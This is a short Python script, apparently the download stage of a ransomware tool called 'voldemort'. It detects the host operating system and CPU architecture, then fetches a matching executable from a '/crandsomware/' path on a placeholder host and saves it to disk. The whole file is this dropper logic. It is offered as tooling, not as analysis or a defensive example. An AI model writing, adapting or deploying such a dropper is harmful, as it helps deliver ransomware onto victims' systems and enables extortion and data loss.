#Author: SergioZ3R0
import platform
import requests
import os

def get_system_info():
    system = platform.system()
    arch = platform.machine()
    return system, arch

def download_executable(system, arch):
    base_url = "https://example.com/crandsomware/"
    if system == "Linux":
        if arch == "x86_64":
            url = base_url + "voldemort_linux_x86_64"
        elif arch == "aarch64":
            url = base_url + "voldemort_linux_aarch64"
        else:
            raise ValueError("Unsupported architecture")
    elif system == "Windows":
        url = base_url + "voldemort_windows.exe"
    elif system == "Darwin":
        url = base_url + "voldemort_macos"
    else:
        raise ValueError("Unsupported operating system")

    response = requests.get(url)
    if response.status_code == 200:
        with open(os.path.basename(url), 'wb') as file:
            file.write(response.content)
        print(f"Downloaded {os.path.basename(url)}")
    else:
        print(f"Failed to download {os.path.basename(url)}")

if __name__ == "__main__":
    system, arch = get_system_info()
    try:
        download_executable(system, arch)
    except ValueError as e:
        print(e)
